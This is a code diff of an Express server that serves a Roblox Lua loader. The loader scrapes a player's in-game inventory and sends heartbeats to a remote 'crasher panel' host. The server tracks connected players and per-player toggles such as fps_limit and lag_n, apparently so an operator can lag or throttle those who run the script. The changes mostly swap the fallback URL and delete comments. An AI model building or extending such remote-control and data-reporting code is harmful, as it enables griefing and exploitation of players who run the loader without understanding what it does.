@@ -5,8 +5,7 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Use PUBLIC_URL env var, then RENDER_EXTERNAL_URL, then your new Railway URL as final fallback
-const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://i-m-gay-production.up.railway.app';
+const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://grape-crasher-panel-2.onrender.com';
 
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
@@ -14,8 +13,7 @@ app.use(express.json({ limit: '10mb' }));
 const players = new Map();
 
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Panel Client v3 ]]--
-local BASE = "${PUBLIC_URL}"
+    const loader = `local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
 local Players = game:GetService("Players")
@@ -61,13 +59,11 @@ local function serverPlayers()
     return t
 end
 
--- Improved brainrot collection with fallback mechanisms
 local function collectBrainrots()
     local list = {}
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
     if not pg then return list end
     
-    -- Try multiple possible GUI locations
     local possibleGUIs = {
         "DuelsMachineSession",
         "DuelsMachine",
@@ -84,7 +80,6 @@ local function collectBrainrots()
     end
     if not gui then return list end
     
-    -- Find any frame that might contain brainrot data
     local targetFrame = nil
     local function findFrame(container)
         if not container then return end
@@ -100,11 +95,9 @@ local function collectBrainrots()
     
     targetFrame = findFrame(gui)
     if not targetFrame then 
-        -- Try direct child
         targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
     end
     if not targetFrame then 
-        -- Try to find any frame with children that looks like a list
         for _, child in ipairs(gui:GetDescendants()) do
             if child:IsA("Frame") and #child:GetChildren() > 3 then
                 targetFrame = child
@@ -122,19 +115,15 @@ local function collectBrainrots()
         local title = nil
         local cash = nil
         
-        -- Look for TextLabels and TextButtons with meaningful text
         for _, obj in ipairs(item:GetDescendants()) do
             if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                 local text = obj.Text
-                -- Skip common UI text and numbers that look like IDs
                 if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
-                    -- Check if it looks like a title (contains letters and is reasonable length)
                     if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                         if not title or (#text > #title) then
                             title = text
                         end
                     end
-                    -- Check if it looks like cash (contains $, Cookie, Milki, or is a large number)
                     if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or 
                        (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                         cash = text
@@ -143,16 +132,13 @@ local function collectBrainrots()
             end
         end
         
-        -- Only add if we found at least one piece of data and it looks valid
         if title or cash then
-            -- Clean up title
             if title and title ~= "" then
                 title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
             end
             if cash and cash ~= "" then
                 cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
             end
-            -- Don't add if title is just a number
             if title and string.match(title, "^%d+$") and not cash then
                 return
             end
@@ -163,13 +149,10 @@ local function collectBrainrots()
         end
     end
     
-    -- Process all children that look like list items
     local function processAll(container)
         if not container then return end
         for _, child in ipairs(container:GetChildren()) do
-            -- If it's a frame with children, process it as a brainrot item
             if child:IsA("Frame") and #child:GetChildren() > 0 then
-                -- Check if it has text elements that look like a brainrot entry
                 local hasText = false
                 for _, desc in ipairs(child:GetDescendants()) do
                     if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
@@ -181,7 +164,6 @@ local function collectBrainrots()
                     processItem(child)
                 end
             end
-            -- Recursively process nested structures
             if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                 processAll(child)
             end
@@ -190,14 +172,12 @@ local function collectBrainrots()
     
     processAll(targetFrame)
     
-    -- If we found Template children specifically, process them
     for _, child in ipairs(targetFrame:GetChildren()) do
         if child.Name == "Template" and child:IsA("Frame") then
             processItem(child)
         end
     end
     
-    -- If we found no brainrots, try a simpler approach: collect any text from the GUI
     if #list == 0 then
         local simpleBrainrots = {}
         local seenTexts = {}
@@ -206,7 +186,6 @@ local function collectBrainrots()
                 local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                 if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                     seenTexts[text] = true
-                    -- Check if it contains cash indicators
                     local cash = "0"
                     if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                         cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
@@ -250,7 +229,6 @@ local function heartbeat()
             })
         end)
         if not success then
-            -- If the main heartbeat fails, try a minimal version
             local simpleBrainrots = {}
             local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
             if pg then
@@ -463,20 +441,16 @@ app.post('/api/public/heartbeat', (req, res) => {
     const userId = String(data.user_id);
     const existing = players.get(userId) || {};
     
-    // Merge brainrots, keeping existing if new ones are empty or invalid
     let brainrots = data.brainrots || [];
     if (!Array.isArray(brainrots) || brainrots.length === 0) {
-        // Keep existing brainrots if we have them and the new ones are empty
         if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
             brainrots = existing.brainrots;
         }
     } else {
-        // Filter out invalid brainrots
         brainrots = brainrots.filter(b => 
             b && typeof b === 'object' && 
             ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
         );
-        // If filtered brainrots are empty but we had existing ones, keep existing
         if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
             brainrots = existing.brainrots;
         }
@@ -499,20 +473,18 @@ app.post('/api/public/heartbeat', (req, res) => {
 app.get('/api/players', (req, res) => {
     const list = [];
     const now = Date.now();
-    const OFFLINE_THRESHOLD = 15000; // 15 seconds
-    const REMOVE_THRESHOLD = 20 * 60 * 1000; // 20 minutes
+    const OFFLINE_THRESHOLD = 15000;
+    const REMOVE_THRESHOLD = 20 * 60 * 1000;
 
     for (const [id, p] of players.entries()) {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
 
-        // Remove if inactive for 20+ minutes
         if (timeSinceLast >= REMOVE_THRESHOLD) {
             players.delete(id);
             continue;
         }
 
-        // Reset toggles when offline but keep brainrots
         if (!online) {
             p.fps_limit = false;
             p.lag_n = false;
@@ -522,7 +494,6 @@ app.get('/api/players', (req, res) => {
         }
 
         p.online = online;
-        // Keep brainrots even when offline
         list.push({ ...p });
         players.set(id, p);
     }
